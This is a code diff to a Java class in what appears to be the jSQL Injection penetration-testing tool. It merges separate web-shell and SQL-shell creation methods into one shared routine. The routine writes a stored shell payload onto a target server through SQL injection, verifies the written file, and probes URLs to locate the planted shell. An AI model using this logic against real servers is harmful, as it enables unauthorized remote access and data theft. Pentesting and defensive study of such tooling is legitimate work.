@@ -14,9 +14,7 @@ import com.jsql.model.InjectionModel;
 import com.jsql.model.bean.util.Header;
 import com.jsql.model.bean.util.Interaction;
 import com.jsql.model.bean.util.Request;
-import com.jsql.model.exception.InjectionFailureException;
 import com.jsql.model.exception.JSqlException;
-import com.jsql.model.exception.StoppedByUserSlidingException;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
 import com.jsql.util.ConnectionUtil;
@@ -42,6 +40,7 @@ import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.*;
 import java.util.concurrent.*;
+import java.util.function.BiFunction;
 import java.util.regex.Pattern;
 
 /**
@@ -236,33 +235,72 @@ public class ResourceAccess {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, result);
         }
     }
-    
+
     /**
      * Create a webshell in the server.
      * @param pathShell Remote path of the file
-     * @throws InterruptedException
-     * @throws InjectionFailureException
-     * @throws StoppedByUserSlidingException
      */
     public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
-        
+
+        BiFunction<String, String, Request> biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -> {
+            var request = new Request();
+            request.setMessage(Interaction.CREATE_SHELL_TAB);
+            request.setParameters(
+                pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY),
+                urlSuccess
+            );
+            return request;
+        };
+
+        createShell(pathShell, urlShell, "shell.web", this.filenameWebshell, biFunctionGetRequest);
+    }
+
+    /**
+     * Create SQL shell on the server. Override username and password eventually.
+     * @param pathShell Script to create on the server
+     * @param urlShell URL for the script (used for url rewriting)
+     * @param username User name for current database
+     * @param password User password for current database
+     */
+    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
+
+        BiFunction<String, String, Request> biFunctionGetRequest = (String pathShellFixed, String urlSuccess) -> {
+            var request = new Request();
+            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
+            request.setParameters(
+                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),
+                urlSuccess,
+                username,
+                password
+            );
+            return request;
+        };
+
+        createShell(pathShell, urlShell, "shell.sql", this.filenameSqlshell, biFunctionGetRequest);
+    }
+
+    public void createShell(
+        String pathShell,
+        String urlShell,
+        String property,
+        String filename,
+        BiFunction<String, String, Request> biFunctionGetRequest
+    ) throws JSqlException, InterruptedException {
+
         if (!this.isReadingAllowed()) {
-            
+
             return;
         }
-        
+
         String bodyShell = StringUtil.base64Decode(
-            this.injectionModel.getMediatorUtils()
-            .getPropertiesUtil()
-            .getProperties()
-            .getProperty("shell.web")
+            this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty(property)
         )
         .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
         .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
         String pathShellFixed = pathShell;
         if (!pathShellFixed.matches(".*/$")) {
-            
+
             pathShellFixed += "/";
         }
 
@@ -271,15 +309,15 @@ public class ResourceAccess {
             .getMediatorVendor()
             .getVendor()
             .instance()
-            .sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameWebshell),
-            "shell:create-web"
+            .sqlTextIntoFile(bodyShell, pathShellFixed + filename),
+            "shell:create"
         );
 
         String resultInjection;
         var sourcePage = new String[]{ StringUtils.EMPTY };
         try {
             resultInjection = new SuspendableGetRows(this.injectionModel).run(
-                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameWebshell),
+                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + filename),
                 sourcePage,
                 false,
                 1,
@@ -291,131 +329,117 @@ public class ResourceAccess {
 
                 throw new JSqlException(MSG_EMPTY_PAYLOAD);
             }
-            
+
         } catch (JSqlException e) {
 
             throw new JSqlException("injected payload does not match source", e);
         }
-        
+
         String urlShellFixed = urlShell;
-        
+
         if (!urlShellFixed.isEmpty()) {
-            
+
             urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
         }
-        
+
         String url = urlShellFixed;
         if (StringUtils.isEmpty(url)) {
-            
+
             url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
         }
 
         if (!resultInjection.contains(bodyShell)) {
-            
+
             throw this.getIntegrityError(sourcePage);
         }
-            
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Web payload created into '{}{}'", pathShellFixed, this.filenameWebshell);
+
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Payload created into '{}{}'", pathShellFixed, filename);
 
         String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
-        
+
         String urlProtocol;
-        
+
         if ("/".equals(urlWithoutProtocol)) {
-            
+
             urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
-            
+
         } else {
-            
+
             urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
         }
-        
+
         String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
-        
+
         List<String> directoryNames = new ArrayList<>();
         if (urlWithoutFileName.split("/").length == 0) {
-            
+
             directoryNames.add("/");
         }
-        
+
         for (String directoryName: urlWithoutFileName.split("/")) {
-            
+
             directoryNames.add(directoryName +"/");
         }
-        
-        this.injectWebshell(pathShellFixed, urlProtocol, directoryNames);
-    }
 
-    private void injectWebshell(String pathShellFixed, String urlProtocol, List<String> directoryNames) throws InterruptedException {
-        
-        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateWebShell");
-        
+        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateShell");
+
         CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
-        
+
         var urlPart = new StringBuilder();
-        
+
         for (String segment: directoryNames) {
-            
+
             urlPart.append(segment);
             taskCompletionService.submit(
-                new CallableHttpHead(
-                    urlProtocol + urlPart + this.filenameWebshell,
-                    this.injectionModel,
-                    "shell#confirm"
-                )
+                    new CallableHttpHead(
+                            urlProtocol + urlPart + filename,
+                            this.injectionModel,
+                            "shell#confirm"
+                    )
             );
         }
 
         int submittedTasks = directoryNames.size();
-        String urlSuccess = this.injectShell(taskCompletionService, submittedTasks);
-
-        taskExecutor.shutdown();
-        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
-        
-        if (urlSuccess != null) {
-            
-            var request = new Request();
-            request.setMessage(Interaction.CREATE_SHELL_TAB);
-            request.setParameters(pathShellFixed.replace(this.filenameWebshell, StringUtils.EMPTY), urlSuccess);
-            this.injectionModel.sendToViews(request);
-            
-        } else {
-            
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Payload not found");
-        }
-    }
-
-    private String injectShell(CompletionService<CallableHttpHead> taskCompletionService, int submittedTasks) {
-        
         String urlSuccess = null;
-        
+
         for (var tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
-            
+
             try {
                 CallableHttpHead currentCallable = taskCompletionService.take().get();
-                
+
                 if (currentCallable.isHttpResponseOk()) {
-                    
+
                     urlSuccess = currentCallable.getUrl();
                     LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Payload found: {}", urlSuccess);
 
                 } else {
-                    
+
                     LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Payload not found: {}", currentCallable.getUrl());
                 }
-                
+
             } catch (InterruptedException e) {
-                
+
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
                 Thread.currentThread().interrupt();
-                
+
             } catch (ExecutionException e) {
-                
+
                 LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
             }
         }
-        
-        return urlSuccess;
+
+        taskExecutor.shutdown();
+        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
+
+        if (urlSuccess != null) {
+
+            var request = biFunctionGetRequest.apply(filename, urlSuccess);
+            this.injectionModel.sendToViews(request);
+
+        } else {
+
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Payload not found");
+        }
     }
     
     /**
@@ -477,186 +501,6 @@ public class ResourceAccess {
         this.injectionModel.sendToViews(request);
 
         return result;
-    }
-
-    /**
-     * Create SQL shell on the server. Override user name and password eventually.
-     * @param pathShell Script to create on the server
-     * @param urlShell URL for the script (used for url rewriting)
-     * @param username User name for current database
-     * @param password User password for current database
-     * @throws InterruptedException
-     * @throws InjectionFailureException
-     * @throws StoppedByUserSlidingException
-     */
-    public void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException, InterruptedException {
-        
-        if (!this.isReadingAllowed()) {
-            
-            return;
-        }
-        
-        String bodyShell = StringUtil.base64Decode(
-            this.injectionModel.getMediatorUtils()
-            .getPropertiesUtil()
-            .getProperties()
-            .getProperty("shell.sql")
-        )
-        .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
-        .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
-
-        String pathShellFixed = pathShell;
-        if (!pathShellFixed.matches(".*/$")) {
-            
-            pathShellFixed += "/";
-        }
-        
-        this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getMediatorVendor().getVendor().instance().sqlTextIntoFile(bodyShell, pathShellFixed + this.filenameSqlshell),
-            "shell:create-sql"
-        );
-
-        String resultInjection;
-        var sourcePage = new String[]{ StringUtils.EMPTY };
-        
-        try {
-            resultInjection = new SuspendableGetRows(this.injectionModel).run(
-                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameSqlshell),
-                sourcePage,
-                false,
-                1,
-                null,
-                "shell:read"
-            );
-
-            if (StringUtils.isEmpty(resultInjection)) {
-                
-                throw new JSqlException(MSG_EMPTY_PAYLOAD);
-            }
-            
-        } catch (JSqlException e) {
-            
-            throw new JSqlException("injected payload does not match source", e);
-        }
-        
-        String urlShellFixed = urlShell;
-        
-        if (!urlShellFixed.isEmpty()) {
-            
-            urlShellFixed = urlShellFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
-        }
-        
-        String url = urlShellFixed;
-        if (StringUtils.isEmpty(url)) {
-            
-            url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
-        }
-
-        if (!resultInjection.contains(bodyShell)) {
-            
-            throw this.getIntegrityError(sourcePage);
-        }
-            
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "SQL payload created into '{}{}'", pathShellFixed, this.filenameSqlshell);
-        
-        String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", StringUtils.EMPTY);
-        
-        String urlProtocol;
-        
-        if ("/".equals(urlWithoutProtocol)) {
-            
-            urlProtocol = url.replaceAll("/+$", StringUtils.EMPTY);
-            
-        } else {
-            
-            urlProtocol = url.replace(urlWithoutProtocol, StringUtils.EMPTY);
-        }
-        
-        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", StringUtils.EMPTY).replaceAll("/+", "/");
-        
-        List<String> directoryNames = new ArrayList<>();
-        
-        if (urlWithoutFileName.split("/").length == 0) {
-            
-            directoryNames.add("/");
-        }
-        
-        for (String directoryName: urlWithoutFileName.split("/")) {
-            
-            directoryNames.add(directoryName +"/");
-        }
-        
-        this.injectShell(username, password, pathShellFixed, urlProtocol, directoryNames);
-    }
-
-    private void injectShell(String username, String password, String pathShellFixed, String urlProtocol, List<String> directoryNames) throws InterruptedException {
-
-        ExecutorService taskExecutor = this.injectionModel.getMediatorUtils().getThreadUtil().getExecutor("CallableCreateSqlShell");
-        
-        CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
-        
-        var urlPart = new StringBuilder();
-        
-        for (String segment: directoryNames) {
-            
-            urlPart.append(segment);
-            taskCompletionService.submit(
-                new CallableHttpHead(
-                    urlProtocol + urlPart + this.filenameSqlshell,
-                    this.injectionModel,
-                    "shell:confirm"
-                )
-            );
-        }
-
-        int submittedTasks = directoryNames.size();
-        int tasksHandled;
-        String urlSuccess = null;
-        
-        for (tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
-            
-            try {
-                CallableHttpHead currentCallable = taskCompletionService.take().get();
-                
-                if (!currentCallable.isHttpResponseOk()) {
-                    
-                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Payload not found at '{}'", currentCallable.getUrl());
-                    continue;
-                }
-                    
-                urlSuccess = currentCallable.getUrl();
-                LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Payload found: '{}'", urlSuccess);
-
-            } catch (InterruptedException e) {
-                
-                LOGGER.log(LogLevelUtil.IGNORE, e, e);
-                Thread.currentThread().interrupt();
-                
-            } catch (ExecutionException e) {
-                
-                LOGGER.log(LogLevelUtil.CONSOLE_JAVA, e, e);
-            }
-        }
-
-        taskExecutor.shutdown();
-        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
-        
-        if (urlSuccess != null) {
-            
-            var request = new Request();
-            request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
-            request.setParameters(
-                pathShellFixed.replace(this.filenameSqlshell, StringUtils.EMPTY),
-                urlSuccess,
-                username,
-                password
-            );
-            this.injectionModel.sendToViews(request);
-            
-        } else {
-            
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "SQL payload not found");
-        }
     }
 
     /**
